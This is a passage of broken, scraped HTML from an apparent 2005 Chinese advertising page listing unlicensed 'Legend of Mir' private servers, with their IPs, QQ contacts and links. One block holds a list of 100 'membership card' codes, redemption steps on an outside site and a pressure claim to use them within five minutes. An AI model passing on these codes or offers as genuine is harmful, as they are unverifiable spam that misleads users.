				<a name="17"><span id="post9">
				仿盛大1.8版</span></a></font></b></font></span></td>
				<td width="268" bgColor="#ecf8ff" style="font-family: 宋体; font-size: 9pt">
				<p align="center">
				<span id="post6" style="font-size: 12px; color: #000000">
		<span id="LeoBBSgg4"><font color="#ff0000"><b>
				<a name="14">广告位招租:QQ818338</b></font></span></span><p align="center">
				　</td>
			</tr>
		</table>
		</a>
		</b></font></span></span></td>
	</tr>
</table>
<div align="center"><HEAD>

<BODY>
<DIV ALIGN="CENTER">
  <div align="center">
	<table width="924" border="0" id="table4">
		<tr borderColor="#ffffff" bgColor="#0000ff">
			<td width="82" height="14" style="font-size: 12px; color: #FFFFFF">
			传奇服务器名</td>
			<td width="97" style="font-size: 12px; color: #FFFFFF">服务器IP</td>
			<td width="179" style="font-size: 12px; color: #FFFFFF">开放时间 年/月/日/时</td>
			<td width="98" style="font-size: 12px; color: #FFFFFF">线路类别</td>
			<td width="109" style="font-size: 12px; color: #FFFFFF">版本介绍</td>
			<td width="116" style="font-size: 12px; color: #FFFFFF">客服QQ</td>
			<td width="104" style="font-size: 12px; color: #FFFFFF">详细介绍</td>
			<td width="105" style="font-size: 12px; color: #FFFFFF">推荐星级</td>
		</tr>
	</table>
	<table width="926" border="0" id="table5">
		<tr>
			<td class="style6" bgcolor="#FFFF00">
			<a href="http://www.mirlm.com">九天一剑</a></td>
			<td class="style6" bgcolor="#FFFF00">218.92.240.21</td>
			<td class="style5" bgcolor="#FFFF00"><SCRIPT language=javascript><!--
function getFullYear(d){//d is a date object
yr=d.getYear();if(yr<1000)
yr+=1900;return yr;}
;document.write(""+getFullYear(today)+"年/"+isnMonths[today.getMonth()]+"/"+today.getDate()+"日/"+clck+""+clckh+"点开放");

//-->

</SCRIPT></td>
			<td class="style49 style6" bgcolor="#FFFF00">江苏电信机房</td>
			<td class="style6" bgcolor="#FFFF00"><font color="#FF0000">盛大1.85<span class="style74">-推荐</span></font></td>
			<td class="style6" bgcolor="#FFFF00">客服QQ：100536146</td>
			<td class="style6" bgcolor="#FFFF00">
			<a class="style49" target="_blank" href="http://www.8899mir.com">点击查看</a><strong><img src="images/new.gif"></strong></td>
			<td class="style5" bgcolor="#FFFF00">★★★★★</td>
		</tr>
		<tr class="style52" borderColor="#ffffff" bgColor="#ffff00">
			<td class="style6">
			极度零点</td>
			<td class="style6">218.92.240.10</td>
			<td class="style5">2005年/9月/17日/中午12：30</td>
			<td class="style49 style6">中国电信</td>
			<td class="style6">仿盛大1.8</td>
			<td class="style6">客服QQ：339222822</td>
			<td class="style6">
			<a class="style49" target="_blank" href="http://www.ld520mir.com/">点击查看</a><strong><img src="images/new.gif"></strong></td>
			<td class="style5"><b><font color="#FF0000">
			★★★★★</font></b></td>
		</tr>
		<tr class="style52" borderColor="#ffffff" bgColor="#ffff00">
			<td class="style6">
			飞龙传说</td>
			<td class="style6">218.92.240.28</td>
			<td class="style5"><span class="style5"><SCRIPT language=javascript><!--
function getFullYear(d){//d is a date object
yr=d.getYear();if(yr<1000)
yr+=1900;return yr;}
;document.write(""+getFullYear(today)+"年/"+isnMonths[today.getMonth()]+"/"+today.getDate()+"日/"+clck+""+clckh+"点开放");

//-->

</SCRIPT></span></td>
			<td class="style49 style6">江苏电信机房</td>
			<td class="style6"><font color="#FF0000">盛大1.85<span class="style74">-推荐</span></font></td>
			<td class="style6">客服QQ：393377424</td>
			<td class="style6">
			<a class="style49" target="_blank" href="http://www.8899mir.com">点击查看</a><strong><img src="images/new.gif"></strong></td>
			<td class="style5"><b><font color="#FF0000">
			<a target="_blank" href="http://xxcq.6jh.com/">★★★★★</a></font></b></td>
		</tr>
		<tr class="style52" borderColor="#ffffff" bgColor="#ffff00">
			<td class="style6" bgColor="#ffff00">
			<a href="http://www.8899mir.com">凤舞九天</a></td>
			<td class="style6">218.92.240.19</td>
			<td class="style5"><SCRIPT language=javascript><!--
function getFullYear(d){//d is a date object
yr=d.getYear();if(yr<1000)
yr+=1900;return yr;}
;document.write(""+getFullYear(today)+"年/"+isnMonths[today.getMonth()]+"/"+today.getDate()+"日/"+clck+""+clckh+"点开放");

//-->

</SCRIPT></td>
			<td class="style49 style6">江苏电信机房</td>
			<td class="style6"><font color="#FF0000">盛大1.8大型版<span class="style74">-推荐</span></font></td>
			<td class="style6">客服QQ：10737673</td>
			<td class="style6" bgColor="#ffff00">
			<a class="style49" target="_blank" href="http://mir.9jh.com/">点击查看</a><strong><img src="images/new.gif"></strong></td>
			<td class="style5">★★★★★</td>
		</tr>
		<tr class="style52" borderColor="#ffffff" bgColor="#ffff00">
			<td class="style6" bgColor="#ffff00">
			<b><font color="#FF0000">颠峰时刻</font></b></td>
			<td class="style6"><b><font color="#FF0000">218.92.240.29</font></b></td>
			<td class="style49"><b><font color="#FF0000">2005年7月29日20：00准时开放</font></b></td>
			<td class="style49 style6"><b><font color="#FF0000">江苏电信机房</font></b></td>
			<td class="style6"><b><font color="#FF0000">仿盛大1.8版</font></b></td>
			<td class="style6"><font color="#FF0000">客服QQ：476820523</font></td>
			<td class="style6" bgColor="#ffff00">
			<b><a class="style49" target="_blank" href="http://www.cn8816.com">
			<font color="#FF0000">点击查看</font></a></b><font color="#FF0000"><strong><img src="images/new.gif"></strong></font></td>
			<td class="style5"><b><font color="#FF0000">★★★★★</font></b></td>
		</tr>
		<tr class="style52" borderColor="#ffffff" bgColor="#ffff00">
			<td class="style6" bgColor="#ffff00">
			<a class="style49" target="_blank" href="http://www.jzcq.8866.org">
			九州传奇</a></td>
			<td class="style6">61.152.158.112</td>
			<td class="style49">2005年/6月/19日/晚上7点开放</td>
			<td class="style49 style6">上海电信</td>
			<td class="style6">仿盛大1.8<span class="style74">-推荐</span></td>
			<td class="style6">客服QQ：309503597</td>
			<td class="style6" bgColor="#ffff00">
			<a class="style49" target="_blank" href="http://www.jzcq.8866.org">
			点击查看</a></td>
			<td class="style5">★★★★★</td>
		</tr>
		<tr class="style52" borderColor="#ffffff" bgColor="#ffff00">
			<td class="style6" bgColor="#ffff00">
			<a class="style49" target="_blank" href="http://www.110mir.com">龙行天下</a></td>
			<td class="style6">221.231.121.12</td>
			<td class="style5"><span class="style49">2005年/6月/19日/晚上9点开放</span></td>
			<td class="style49 style6">上海电信</td>
			<td class="style6">超越盛大1.8<span class="style74">-推荐</span></td>
			<td class="style6">客服QQ：307623618</td>
			<td class="style6" bgColor="#ffff00">
			<a class="style49" target="_blank" href="http://www.110mir.com">点击查看</a></td>
			<td class="style5">★★★★★</td>
		</tr>
		<tr class="style52" borderColor="#ffffff" bgColor="#ffff00">
			<td class="style6" bgColor="#ffff00" colspan="8">
			送100张传奇会员充值卡！快抢充值，要更多请加QQ:550904824
			<p>
			感谢你玩我们的游戏[九天一剑]（仿盛大1.85,上线送极品装备），我们会更好的为你服务！现送月卡会员一张!请在五分钟内使用，否则会无效!</p>
			<p style="MARGIN: 0px 10px; LINE-HEIGHT: 150%">
			<font color="#000080" size="4"><b>九天主区:</b></font></p>
			<p style="MARGIN: 0px 10px; LINE-HEIGHT: 150%"><b>
			<font color="#cc6600" size="4">初始等级:40级 送精品装备</font></b></p>
			<p style="MARGIN: 0px 10px; LINE-HEIGHT: 150%"><b>
			<font color="#cc6600" size="4">游戏名:九天一剑</font></b></p>
			<p style="MARGIN: 0px 10px; LINE-HEIGHT: 150%"><b>
			<font color="#cc6600" size="4">IP:218.92.240.21</font></b></p>
			<p style="MARGIN: 0px 10px; LINE-HEIGHT: 150%" align="left">升级会员方法:
			</p>
			<p style="MARGIN: 0px 10px; LINE-HEIGHT: 150%" align="left">
			第一步：现登陆游戏，创建游戏人物名称进入游戏，系统自动给你升级到40级，并发放一套极品装备，设定好你的人物后不需要退出游戏 </p>
			<p style="MARGIN: 0px 10px; LINE-HEIGHT: 150%" align="left">第二步：到本站 
			<a href="http://m.fiq.cn/">http://m.fiq.cn/</a> 
			来写入会员卡号和游戏人物名称及验证码后升级会员 </p>
			<p style="MARGIN: 0px 10px; LINE-HEIGHT: 150%" align="left">
			第三步：升级会员后到盟重土城找“游戏助理”，到&quot;加入会员&quot;，可以享受很多会员功能和进入高级地图打更好的装备！ </p>
			<p>编号:1041 卡号(1): 7508D-Z1YA5-1I20X-K8M32-6ZD56<br>
			编号:1040 卡号(2): 3W4Z1-H37U5-LCX8Y-88HL2-B5V5R<br>
			编号:1039 卡号(3): 7N0AM-DVZ4V-48I8F-MTV6P-8Q519<br>
			编号:1038 卡号(4): UP842-YVDMP-23IUZ-V7TRH-79OI7<br>
			编号:1037 卡号(5): Y07GU-BUX2E-55HXN-S1UAX-V5UA2<br>
			编号:1036 卡号(6): A0UTN-96439-396YH-78J3Q-US13B<br>
			编号:1035 卡号(7): QRU4Z-YF97J-136W7-MU2G1-SVFN4<br>
			编号:1034 卡号(8): UPFZS-VA881-073AN-N3CSW-T9Y92<br>
			编号:1033 卡号(9): 55I4I-985ZR-9L57C-KPB34-4CKE8<br>
			编号:1032 卡号(10): 5BN59-T2FSI-0QT1R-3673B-H79D4<br>
			编号:1031 卡号(11): HO23K-427N7-557ME-7DOS5-3RQN8<br>
			编号:1030 卡号(12): HJ1Z3-6G84R-7163B-1XRX4-2689V<br>
			编号:1029 卡号(13): 216M8-OO1W2-VPFC6-F9059-5949J<br>
			编号:1028 卡号(14): 3L574-4TOTW-R3K9G-857BQ-1CYJ0<br>
			编号:1027 卡号(15): 3C43B-L9HHL-V7I8U-9548E-AYDTP<br>
			编号:1026 卡号(16): 8NMLB-15MRK-06QL8-J5ZU2-V8F3O<br>
			编号:1025 卡号(17): X0J8U-D6201-29OE5-5L7MX-T546H<br>
			编号:1024 卡号(18): 3E15D-I6K3O-WS31W-91Z0H-C8MD6<br>
			编号:1023 卡号(19): 0J95T-4SV0C-SRF4M-DXK98-C43R2<br>
			编号:1022 卡号(20): BLRZ5-6Z7UV-959C2-CQ625-A7KX0<br>
			编号:1021 卡号(21): F868B-3QUWL-V3E4U-90RP1-03R5P<br>
			编号:1020 卡号(22): I863U-68A6E-Q855P-9RF99-0OBXI<br>
			编号:1019 卡号(23): 19F5K-K4K87-5OBZ1-Y9P35-E0Q69<br>
			编号:1018 卡号(24): HELTU-35CQ2-X5I45-A8I4Y-G4163<br>
			编号:1017 卡号(25): DC304-OJ5QT-YG201-0009N-4X1NW<br>
			编号:1016 卡号(26): 39B7D-5CT85-W5H28-CO352-CP42R<br>
			编号:1015 卡号(27): G7H17-448G1-X1NY4-D731V-39SFF<br>
			编号:1014 卡号(28): B26EN-K1358-9HXGF-97FB6-AO300<br>
			编号:1013 卡号(29): ZL50L-X5JR8-E63Y2-5YGK5-WX679<br>
			编号:1012 卡号(30): IRQ57-KZQMF-QPM65-U88U9-03ABI<br>
			编号:1011 卡号(31): IJ503-KF3A7-U0K5D-YU55N-3M91W<br>
			编号:1010 卡号(32): V7ODJ-B8OK7-LE481-38BNO-70H08<br>
			编号:1009 卡号(33): 8ILP1-1Y28M-G1QX8-NR8E2-TV4JQ<br>
			编号:1008 卡号(34): 8O1DS-WBM9D-31364-4N05W-QFO6G<br>
			编号:1007 卡号(35): 9A364-YB548-GA97F-6HDJ5-6WCBZ<br>
			编号:1006 卡号(36): P8TOC-E3U34-4X96U-Q06VE-9M2FN<br>
			编号:1005 卡号(37): OWT6R-S69RB-1332K-IAVK7-LJ83F<br>
			编号:1004 卡号(38): VH793-1GC2T-EF501-5CHNN-69CMX<br>
			编号:1003 卡号(39): QH99E-Y7025-DY7J9-433T2-743A6<br>
			编号:1002 卡号(40): R2X8T-T6571-IR854-LZUOW-QPRTG<br>
			编号:1001 卡号(41): ZBV2C-KIAV4-TFT2U-80O2F-2WPT5<br>
			编号:1000 卡号(42): EYX16-30PIA-7ND7K-9O1ZU-9P2S1<br>
			编号:999 卡号(43): BT73K-24HLU-T00E1-Z6W3N-DX2L9<br>
			编号:998 卡号(44): 3OF39-211AK-T2TR7-T70M1-H8YG4<br>
			编号:997 卡号(45): 2H45S-FKF21-L42N5-V7D98-1743G<br>
			编号:996 卡号(46): SU0O7-VC05D-BS9U5-PG0OV-W72W2<br>
			编号:995 卡号(47): 7L694-72488-2CNKG-3864Q-UP0BZ<br>
			编号:994 卡号(48): 0QK76-36490-S0HL3-096U7-B9DR1<br>
			编号:993 卡号(49): D12E4-J71KU-50M41-8N675-A63Y9<br>
			编号:992 卡号(50): UXCV7-F7DJ0-IMH34-38Y28-Y8FD1<br>
			编号:991 卡号(51): C72DK-B8JWV-377F2-7097O-19QG9<br>
			编号:990 卡号(52): 1WY51-H12PO-OQLXY-T7DB3-0FRM6<br>
			编号:989 卡号(53): 665C6-8K710-H11T3-4768U-Y4J5C<br>
			编号:988 卡号(54): U6Q53-06097-C5M71-LL1FN-9PTX8<br>
			编号:987 卡号(55): 17U4K-42Z77-AT4QC-Y8F35-F9258<br>
			编号:986 卡号(56): HTOGZ-7LYWI-X1L9S-A4L90-GBH1M<br>
			编号:985 卡号(57): Y25U6-3573Y-T44U3-UG2TS-F0I2B<br>
			编号:984 卡号(58): IN1F2-5R836-WCK70-C1K04-M42N7<br>
			编号:983 卡号(59): 23BKB-K0554-9QH27-121LE-H4M55<br>
			编号:982 卡号(60): MD4J6-KSL00-8807J-XJIOU-442I1<br>
			编号:981 卡号(61): KWRR3-72F07-0I2H0-ZJ3BN-HI7KX<br>
			编号:980 卡号(62): 1W1L8-2F1LF-4U0Q6-031LY-283T3<br>
			编号:979 卡号(63): 382J7-3T121-75EVM-9I3WW-J07MF<br>
			编号:978 卡号(64): 0V1GE-3X1MO-62A9X-Z2K3G-AD81R<br>
			编号:977 卡号(65): 1306X-I9W92-4F2ZR-77KHB-9WC44<br>
			编号:976 卡号(66): 6992G-0SZU5-1418Z-F8U6K-7WA5S<br>
			编号:975 卡号(67): 73E79-74HOK-AJRXT-LQWM1-U5PXM<br>
			编号:974 卡号(68): I5DQ2-4U476-7H60B-943EL-HW85U<br>
			编号:973 卡号(69): C6Z5C-PSW34-6C528-VUBIF-34UAO<br>
			编号:972 卡号(70): 163G6-4QTPA-XXZ1J-W4YXU-3QNO1<br>
			编号:971 卡号(71): 8863Z-03W63-2NOU7-FQ34D-M6J7N<br>
			编号:970 卡号(72): 55S45-AFCAY-1X613-2FPDS-5VLI0<br>
			编号:969 卡号(73): 8BV89-WZ27J-FW017-H78C1-SNW6M<br>
			编号:968 卡号(74): QP10P-V781Y-1E353-4GK8S-7523B<br>
			编号:967 卡号(75): 7UP74-2UV57-4CVPF-6S6U5-UYA8Z<br>
			编号:966 卡号(76): Y507A-347E3-3I5CU-71P6D-9X7RN<br>
			编号:965 卡号(77): X3FZ7-2TTK1-487Q5-4894Y-U8HT3<br>
			编号:964 卡号(78): 6377G-19M4P-I5IS9-4U67J-7IW07<br>
			编号:963 卡号(79): PZ2EZ-0E883-CQE67-F4IQ1-6D724<br>
			编号:962 卡号(80): 5H65P-8368Z-16OII-46YR6-N64NC<br>
			编号:961 卡号(81): P8503-V4KG7-96731-2FY6M-W63N7<br>
			编号:960 卡号(82): P0H59-ZWIC2-D6ND6-5JXTA-TBK83<br>
			编号:959 卡号(83): 2R1T0-6AA24-NR6W8-9XW41-IU58O<br>
			编号:958 卡号(84): T6P72-899U6-1LDCZ-35V2J-SZI67<br>
			编号:957 卡号(85): 08B2L-5YY0T-QJ69E-80105-36WT8<br>
			编号:956 卡号(86): DY4ZZ-4XVIJ-8DB97-87A61-H8PHM<br>
			编号:955 卡号(87): I2KS7-Q75A0-8W2E4-E37OV-K3VVF<br>
			编号:954 卡号(88): J6T0Q-8JDQZ-ZBQTJ-CJQT7-IZMYD<br>
			编号:953 卡号(89): 6A20Q-S9U90-B8MJK-1SIHV-OM381<br>
			编号:952 卡号(90): M5R22-RSI46-91W70-2F803-QOUN7<br>
			编号:951 卡号(91): JKNKA-YK7GJ-BS7G7-HH6LD-4NY55<br>
			编号:950 卡号(92): U5N97-1LFJB-23AI4-61088-78GW2<br>
			编号:949 卡号(93): T27FM-0S2PV-3UGWF-3UKQ6-PUUZZ<br>
			编号:948 卡号(94): Q6T5B-DI42K-393M7-N1651-URW8O<br>
			编号:947 卡号(95): LYUJ6-91IBA-YP68L-46O57-50FME<br>
			编号:946 卡号(96): O6S34-VS767-FAPC1-NA9LN-9G10W<br>
			编号:945 卡号(97): 6E581-8U4AO-4I5V8-S8SDG-8ZJHQ<br>
			编号:944 卡号(98): L077P-VV8IY-Y693J-43JYS-PA80C<br>
			编号:943 卡号(99): N5033-XWX86-2VGEB-GUTA4-664LV<br>
			编号:942 卡号(100): O609X-7WLAI-036I6-25240-N98W4<br>
			996<br>
　</p>
			<p>　</td>
		</tr>
	</table>
	<table width="926" border="0" id="table11">
		<tr class="style52" borderColor="#ffffff" bgColor="#ffff00">
			
>